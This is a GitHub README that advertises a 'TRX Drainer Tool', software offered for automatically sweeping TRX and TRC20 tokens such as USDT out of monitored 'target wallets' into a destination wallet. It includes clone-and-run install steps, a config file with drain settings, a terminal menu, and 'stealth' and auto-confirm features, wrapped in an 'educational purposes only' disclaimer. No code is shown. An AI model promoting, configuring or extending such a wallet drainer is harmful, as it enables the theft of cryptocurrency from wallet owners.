# TRX-Drainer-Tool
TRX Drainer Tool — Automated TRX and TRC20 token drainer for TRON wallets with real-time balance monitoring, multi-wallet sweeping, TronLink/Trust Wallet compatibility, and stealth energy-optimized transaction routing
<div align="center">

```
████████╗██████╗ ██╗  ██╗
╚══██╔══╝██╔══██╗╚██╗██╔╝
   ██║   ██████╔╝ ╚███╔╝
   ██║   ██╔══██╗ ██╔██╗
   ██║   ██║  ██║██╔╝ ██╗
   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝
   ██████╗ ██████╗  █████╗ ██╗███╗   ██╗███████╗██████╗
   ██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝██╔══██╗
   ██║  ██║██████╔╝███████║██║██╔██╗ ██║█████╗  ██████╔╝
   ██║  ██║██╔══██╗██╔══██║██║██║╚██╗██║██╔══╝  ██╔══██╗
   ██████╔╝██║  ██║██║  ██║██║██║ ╚████║███████╗██║  ██║
   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
```

# TRX Drainer Tool

[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/)
[![TRON](https://img.shields.io/badge/TRON-Blockchain-FF060A?style=for-the-badge&logo=tron&logoColor=white)](https://tron.network/)
[![Platform](https://img.shields.io/badge/Platform-Windows%20|%20macOS%20|%20Linux-0078D4?style=for-the-badge)](/)
[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)

**Automated TRX and TRC20 token drainer for TRON wallets — real-time balance monitoring, multi-wallet sweeping, energy-optimized transactions, and TronLink/Trust Wallet compatibility**

[Features](#features) • [How It Works](#how-it-works) • [Getting Started](#getting-started) • [Configuration](#configuration) • [Usage](#usage) • [FAQ](#faq)

</div>

---

## How It Works

TRX Drainer Tool monitors target TRON wallet addresses via TRON RPC API polling. When a balance above the configured threshold is detected, the tool constructs and submits a transaction that transfers TRX and TRC20 tokens to a predefined destination wallet. Energy optimization mode uses fee delegation and energy rental to minimize transaction costs.

The drainer engine uses:
- **TRON RPC API** for balance monitoring
- **TRC20 contract interaction** for token transfers
- **Energy optimization** via fee delegation
- **Multi-RPC failover** for reliability

---

## Features

<table>
<tr>
<td width="50%">

| Feature | Status |
|---------|:------:|
| Multi-wallet sweeping | + |
| TRX & TRC20 token draining | + |
| Real-time balance monitoring | + |
| Energy-optimized transactions | + |
| TronLink/Trust Wallet support | + |
| Auto-confirm transactions | + |

</td>
<td width="50%">

| Feature | Status |
|---------|:------:|
| Custom fee limits | + |
| Minimum balance threshold | + |
| Fee delegation support | + |
| Multi-RPC failover | + |
| Telegram notifications | + |
| Cross-platform support | + |

</td>
</tr>
</table>

---

## Supported Wallets

| Wallet | Support |
|--------|:------:|
| TronLink | Full |
| Trust Wallet | Full |
| Ledger | Full |
| ImToken | Full |
| BitKeep | Full |
| TokenPocket | Full |

---

## Supported Tokens

| Category | Tokens |
|----------|--------|
| **Native** | TRX |
| **Stablecoins** | USDT, USDC, TUSD, USDJ |
| **DeFi** | JST, SUN, WIN, BTT, NFT |
| **Meme** | BTT, WIN, NFT, APENFT |

---

## Getting Started

### Prerequisites

- **OS:** Windows 10/11, macOS 12+, or Linux
- **Python:** 3.10 or newer

### Installation

```bash
git clone https://github.com/fiercewarrior84/TRX-Drainer-Tool.git
cd TRX-Drainer-Tool
```

**Windows:**

```bash
run.bat
```

**macOS / Linux:**

```bash
chmod +x run.sh
./run.sh
```

### Dependencies

| Package | Version | Purpose |
|---------|---------|---------|
| rich | >=13.0.0 | Terminal UI & formatting |
| cryptography | latest | Data encryption |
| psutil | latest | Process detection |
| requests | latest | API price feeds |
| tronpy | latest | TRON RPC client |

---

## Configuration

Edit `config.json`:

```json
{
    "target_wallets": [],
    "destination_wallet": "",
    "drain_mode": "sweep",
    "min_balance_trx": 100,
    "include_trc20": true,
    "trc20_tokens": ["USDT", "USDC", "BTT", "WIN", "JST"],
    "rpc_endpoint": "https://api.trongrid.io",
    "energy_optimize": true,
    "auto_confirm": true,
    "fee_limit": 10000000
}
```

| Parameter | Type | Description |
|-----------|------|-------------|
| `target_wallets` | list | TRON addresses to monitor |
| `destination_wallet` | string | Receiving wallet address |
| `drain_mode` | string | `"sweep"` (all) or `"selective"` |
| `min_balance_trx` | int | Minimum TRX to trigger drain |
| `include_trc20` | bool | Also drain TRC20 tokens |
| `trc20_tokens` | list | TRC20 token symbols to drain |
| `rpc_endpoint` | string | TRON RPC URL |
| `energy_optimize` | bool | Use fee delegation for lower costs |
| `auto_confirm` | bool | Auto-confirm transactions |
| `fee_limit` | int | Max transaction fee in SUN |

---

## Usage

### Terminal Menu

```bash
python main.py
```

```
+--------------------------------------------------------------+
|              TRX DRAINER TOOL                                |
|    Automated Wallet Drainer . TRON                           |
+--------------------------------------------------------------+
|  #   Action                  Description                     |
|  1   Install Dependencies    pip install -r requirements.txt |
|  2   Settings                RPC, fees, energy config        |
|  3   About                   Features & contact info         |
|  4   Add Target Wallets      Add TRON addresses              |
|  5   Set Destination         Set receiving wallet            |
|  6   Start Drainer           Begin monitoring & draining     |
|  7   Stop Drainer            Stop all operations             |
|  8   Status Check            View active drainer status      |
|  0   Exit                    Quit                            |
+--------------------------------------------------------------+
```

### Quick Start

1. **Install dependencies:** Select option `1`
2. **Add target wallets:** Select option `4` and enter TRON addresses
3. **Set destination:** Select option `5` and enter receiving wallet
4. **Start drainer:** Select option `6` — monitoring begins
5. **Stop:** Select option `7` to halt all operations

---

## Project Structure

```
TRX-Drainer-Tool/
├── main.py                    # Entry point, terminal menu
├── config.py                  # Configuration loader
├── bot_actions.py             # Core drainer actions
├── requirements.txt
├── run.bat / run.sh
├── config.json                # Drainer settings
├── actions/
│   ├── about.py               # Project info
│   ├── install.py             # Dependency installer
│   └── settings.py            # Setup instructions
├── helpers/
│   ├── ui.py                  # Rich terminal interface
│   └── ...
└── release/
    └── README.md              # Binary info
```

---

## FAQ

<details>
<summary><b>Is this tool legal?</b></summary>

This tool is provided for educational and research purposes only. Unauthorized access to wallets you do not own is illegal. Always comply with applicable laws in your jurisdiction.
</details>

<details>
<summary><b>What is energy optimization?</b></summary>

TRON uses a resource model (Energy and Bandwidth) for transaction fees. Energy optimization uses fee delegation and energy rental strategies to minimize the TRX burned per transaction, making draining more cost-effective.
</details>

<details>
<summary><b>Which RPC endpoints are supported?</b></summary>

Any TRON RPC endpoint is supported. Recommended: TronGrid (official), Ankr, GetBlock, or your own full node. API keys may be required for higher rate limits.
</details>

<details>
<summary><b>Does this drain TRC20 tokens too?</b></summary>

Yes, when `include_trc20` is enabled, the tool will detect and drain specified TRC20 token balances from target wallets via the TRC20 contract transfer method.
</details>

---

## Disclaimer

<div align="center">

* **This tool is provided for educational and demonstration purposes only.** *

The authors are not responsible for any misuse of this software. Unauthorized access to cryptocurrency wallets is illegal in most jurisdictions. Always comply with applicable regulations.

</div>

---

<div align="center">

**Support this project**

If this tool helps you, consider giving it a *

</div>
